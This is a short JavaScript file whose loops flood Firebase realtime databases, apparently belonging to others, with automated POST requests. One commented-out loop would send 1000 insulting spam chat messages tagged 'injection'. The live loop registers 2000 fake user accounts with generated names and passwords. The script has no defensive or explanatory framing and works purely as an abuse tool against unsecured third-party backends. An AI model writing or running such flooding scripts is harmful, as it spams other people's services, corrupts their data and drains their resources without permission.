/*
for(let i = 0 ; i <1000 ; i++){
    fetch("https://msgchatenshi-default-rtdb.firebaseio.com/mschat.json", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            user: "anon4266",
            msg: "nuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuub silec",
            city: "Filipinas",
            region: "FP",
            country: `injection ${i}`,
        })
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));


}*/
for(let i = 2000; i  <4000 ; i++){
    fetch("https://getusersingin-default-rtdb.firebaseio.com/users.json", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            name: `anon${i}`,
            password: `password${i}`,
        })
    })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error('Error:', error));


}
    